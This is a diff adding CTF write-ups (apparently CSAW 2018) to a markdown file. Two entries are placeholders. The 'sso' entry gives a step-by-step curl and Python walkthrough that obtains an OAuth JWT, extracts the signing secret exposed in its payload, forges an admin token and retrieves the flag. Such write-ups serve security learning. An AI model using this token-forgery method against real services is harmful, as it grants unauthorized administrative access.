@@ -385,7 +385,315 @@ Coming soon.
 
 
 
+## babycrypto
 
+**Category:** Crypto
+**Points:** 50
+**Solved:** 295
+**Description:**
+
+> yeeeeeeeeeeeeeeeeeeeeeeeeeeeeeet
+
+> single yeet yeeted with single yeet == 0
+
+> yeeet
+
+> what is yeet?
+
+> yeet is yeet
+
+> Yeetdate: yeeted yeet at yeet: 9:42 pm
+
+**Attached:** [ciphertext.txt](resources/crypto-50-babycrypto/ciphertext.txt)
+
+<p align="center">
+<img src="resources/crypto-50-babycrypto/_description.PNG"/>
+</p>
+
+### Write-up
+Coming soon.
+
+
+
+
+
+
+
+## Short Circuit
+
+**Category:** Misc
+**Points:** 75
+**Solved:** 162
+**Description:**
+
+> Start from the monkey's paw and work your way down the high voltage line, for every wire that is branches off has an element that is either on or off. Ignore the first bit. Standard flag format.
+
+> Elyk
+
+**Attached** [20180915_074129.jpg](resources/misc-75-short_circuit/20180915_074129.jpg)
+**Hint:** There are 112 Things You Need to Worry About
+
+<p align="center">
+<img src="resources/misc-75-short_circuit/_description.PNG"/>
+</p>
+
+
+### Write-up
+In this task we are given a photo that contains a circuit from which we should find the flag.
+
+Personally, I solved this task without that hint.
+
+Coming soon
+
+
+
+
+
+
+
+
+## sso
+
+**Category:** Web
+**Points:** 100
+**Solved:** 210
+**Description:**
+
+> Don't you love undocumented APIs
+
+> Be the admin you were always meant to be
+
+> http://web.chal.csaw.io:9000
+
+> Update chal description at: 4:38 to include solve details
+
+> Aesthetic update for chal at Sun 7:25 AM
+
+<p align="center">
+<img src="resources/web-100-sso/_description.PNG"/>
+</p>
+
+### Write-up
+In this task, we have the given web page `http://web.chal.csaw.io:9000` :
+
+<p align="center">
+<img src="resources/web-100-sso/1.PNG"/>
+</p>
+
+In the source code we can finde more details about the available URLs:
+
+<p align="center">
+<img src="resources/web-100-sso/2.PNG"/>
+</p>
+
+So we have to access to `http://web.chal.csaw.io:9000/protected`. But, when we access to this page, we get this error :
+
+<p align="center">
+<img src="resources/web-100-sso/3.PNG"/>
+</p>
+
+We need an Authorization header which is used in many applications that provides the Single Sign-on which is an access control property that gives a user a way to authenticate a single time to be granted to access to many systems if he is authorized.
+
+
+And that's why we need those 3 links :
+
+> `http://web.chal.csaw.io:9000/oauth2/authorize` : To get the authorization from the Oauth server
+
+> `http://web.chal.csaw.io:9000/oauth2/token` : To request for the JWT token that will be used later in the header (as Authorization header) instead of the traditional of creating a session in the server and returning a cookie.
+
+> `http://web.chal.csaw.io:9000/protected` : To get access to a restricted page that requires the user to be authenticated. The user should give the Token in the Authorization header. So the application could check if the user have the required authorization. The JWT Token contains also the user basic data such as "User Id" without sensitive data because it is visible to the client.
+
+In this example, the Oauth server and the application that contains a protected pages are the same.
+
+In real life, this concept is used in social media websites that are considered as a third party providing an Oauth service to authenticate to an external website using the social media's user data.
+
+Now let's see what we should do.
+
+First, we sould get the authorization from the Oauth server using these parameters:
+
+> URL : http://web.chal.csaw.io:9000/oauth2/authorize
+
+> Data : response_type=code : This is mandatory
+
+> Data : client_id=A_CLIENT_ID : in this task, we can use any client_id, but we should remember it always as we use it the next time in thet /oauth2/token page
+
+> Data : redirect_uri=http://web.chal.csaw.io:9000/oauth2/token : if the authorization succeeded (in the Oauth server), the user will be redirected to this URI (in the application) to get the generated token. In this task we can use any redirect_uri. Because, in any way, we are not going to follow this redirection
+
+> Data : state=123 : Optionally we can provide a random state. Even, if we don't provide it, it will be present in the response when the authorization succeed
+
+So in shell command, we can use cURL command to get the authorization :
+
+```
+cl_id=1
+echo "POST http://web.chal.csaw.io:9000/oauth2/authorize"
+auth_key=$(curl --silent 2>&1 -X POST  http://web.chal.csaw.io:9000/oauth2/authorize --data "response_type=code&client_id=${cl_id}&redirect_uri=http://web.chal.csaw.io:9000/oauth2/token&state=123" | awk -v FS="code=|&amp;state" '{print $2}')
+echo "Getting Authorization Code : ${auth_key}"
+```
+
+Output :
+
+```
+Getting Authorization Code : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjbGllbnRfaWQiOiIxIiwicmVkaXJlY3RfdXJpIjoiaHR0cDovL3dlYi5jaGFsLmNzYXcuaW86OTAwMC9vYXV0aDIvdG9rZW4iLCJpYXQiOjE1MzcyMjU2MTEsImV4cCI6MTUzNzIyNjIxMX0.LM3-5WruZfx1ld9SidXAGvnF3VNMovuBU4RtFYy8rrg
+```
+
+So, this is the autorization code that we should use to generate the JWT Token from the application.
+
+Let's continue.
+
+As we said, we will not follow the redirection. Even you did that, you will get an error. I'm going to explain that.
+
+Next, we send back that Authorization Code to the application (`http://web.chal.csaw.io:9000/oauth2/token`) :
+
+> URL : http://web.chal.csaw.io:9000/oauth2/token
+
+> Data : grant_type=authorization_code : mandatory
+
+> Data : code=THE_GIVEN_AUTHORIZATION_CODE : the given authorization code stored in auth_key variable from the previous commands
+
+> Data : client_id=SAME_CLIENT_ID : the same client id used in the begining (variable cl_id)
+
+> Data : redirect_uri=http://web.chal.csaw.io:9000/oauth2/token : this URI should be the same redirect_uri previously used
+
+So the cURL command will be :
+
+```
+echo "POST http://web.chal.csaw.io:9000/oauth2/token (using this Authorization Code"
+token=$(curl --silent 2>&1 -X POST  http://web.chal.csaw.io:9000/oauth2/token --data "grant_type=authorization_code&code=${auth_key}&client_id=${cl_id}&redirect_uri=http://web.chal.csaw.io:9000/oauth2/token")
+echo "Getting Json Response : ${token}"
+```
+
+Output :
+
+```
+Getting Json Response : {"token_type":"Bearer","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoidXNlciIsInNlY3JldCI6InVmb3VuZG1lISIsImlhdCI6MTUzNzIyNTYxMSwiZXhwIjoxNTM3MjI2MjExfQ.X6n_Z0YI0WRPwQAEOcsagwjR8nLx1i9mDJtYedlYG1k"}
+```
+
+And, we get the Json response from the token page. Now, this application generated for us a JWT Token that contains some data that identifies our user which is supposed to be previously authenticated to the Oauth server (I repeat, I said it's supposed to be. To give you an example, it's like a website, that needs to get authorization from Facebook to get access to your user data and then it returns a JWT Token that contains an ID that identifies you from other users in this external website. So you should be previously authenticated to the Oauth server (Facebook) before that this external website gets an authorization to get access to your user data. Seems logical).
+
+Let's extract the JWT Token from the Json response :
+
+```
+jwt=$(echo $token | python -c "import sys, json;data = json.load(sys.stdin);print data['token'];")
+echo "Extracting JWT Token : ${jwt}"
+```
+
+Output :
+
+```
+Extracting JWT Token : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoidXNlciIsInNlY3JldCI6InVmb3VuZG1lISIsImlhdCI6MTUzNzIyNTYxMSwiZXhwIjoxNTM3MjI2MjExfQ.X6n_Z0YI0WRPwQAEOcsagwjR8nLx1i9mDJtYedlYG1k
+```
+
+Nice ! Now, we decode this JWT Token using python. If you don't have installed the 'PyJWT' python library, you should install it in Python2.x :
+
+```
+pip install PyJWT
+jwt_decoded=$(pyjwt decode --no-verify $jwt)
+echo "Decoding JWT Token : ${jwt_decoded}"
+```
+
+Output :
+
+```
+Decoding JWT Token : {"iat": 1537225611, "secret": "ufoundme!", "type": "user", "exp": 1537226211}
+```
+
+Good ! Now, we know that secret="ufoundme!" and the type="user".
+
+In the first impression when I get this output, I said, why there is no username or user id and instead there is the secret ?
+
+Maybe my user is an admin as expected from the task description.
+
+But when I try to access to the protected page using this JWT Token I get this :
+
+```
+curl  http://web.chal.csaw.io:9000/protected -H "Authorization: Bearer ${jwt}"
+```
+
+Output :
+
+```
+You must be admin to access this resource
+```
+
+Wait... What ? Why I'm not already an admin ?
+
+When I checked again all the previous steps I said there is no way how to set my user to be an admin, I didn't get it how to do that.
+
+Because, as I said, the user is supposed to be authenticated to the Oauth server.
+
+Some minutes later I though that the solution is behind this line :
+
+```
+Decoding JWT Token : {"iat": 1537225611, "secret": "ufoundme!", "type": "user", "exp": 1537226211}
+```
+
+Maybe, type="user" should be type="admin". But, in JWT, if the used algorithm that generates the token is HS256, there is no way to break it. Because JWT Token is composed from "Header"+"Payload"+"Hash". And when we modify the Payload, we should have the key that is used to hash the payload to get a valid JWT Token.
+
+And, from there I get the idea that maybe the hash is computed using a key which is a secret string. And since we have in the payload secret="ufoundme!", this will make sense !
+
+Let's try it !
+
+First, we edit the payload like this (we can change exp value and extend it if the token is expired) :
+
+```
+{"iat": 1537227625, "secret": "ufoundme!", "type": "admin", "exp": 1537228225}
+```
+
+So, we need using these commands :
+
+```
+jwt_decoded_admin=$(echo $jwt_decoded | sed -e 's/user/admin/')
+echo "Replacing 'user by 'admin' : ${jwt_decoded_admin}"
+```
+
+Output :
+
+```
+Replacing 'user by 'admin' : {"iat": 1537227625, "secret": "ufoundme!", "type": "admin", "exp": 1537228225}
+```
+
+Then, we generate again the JWT Token using the alogirhm HS256 and using the secret "ufoundme!" :
+
+```
+secret=$(echo $jwt_decoded_admin | python -c "import sys, json;data = json.load(sys.stdin);print data['secret'];")
+echo "Extracting JWT secret for signing while encoding this payload : ${secret}"
+jwt_new=$(python -c "import jwt;print jwt.encode(${jwt_decoded_admin}, '${secret}', algorithm='HS256')")
+echo "Generating the new JWT Token : ${jwt_new}"
+```
+
+Output :
+
+```
+Extracting JWT secret for signing while encoding this payload : ufoundme!
+Generating the new JWT Token : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE1MzcyMjc2MjUsInNlY3JldCI6InVmb3VuZG1lISIsInR5cGUiOiJhZG1pbiIsImV4cCI6MTUzNzIyODIyNX0.Y-7Ew7nYIEMvRJad_T8_cqZpPxAo_KOvk24qeTce9S8
+```
+
+We can check the content of the JWT Token if needed :
+
+
+```
+verif=$(pyjwt decode --no-verify $jwt_new)
+```
+
+Output :
+
+```
+Verifing the JWT Token content : {"iat": 1537227625, "secret": "ufoundme!", "type": "admin", "exp": 1537228225}
+```
+
+And finally we send try again get accessing to the protected page using this newly created JWT :
+
+```
+curl  http://web.chal.csaw.io:9000/protected -H "Authorization: Bearer ${jwt_new}"
+```
+
+Output :
+
+```
+flag{JsonWebTokensaretheeasieststorage-lessdataoptiononthemarket!theyrelyonsupersecureblockchainlevelencryptionfortheirmethods}
+```
+
+So, the flag is `flag{JsonWebTokensaretheeasieststorage-lessdataoptiononthemarket!theyrelyonsupersecureblockchainlevelencryptionfortheirmethods}`
 
 
 
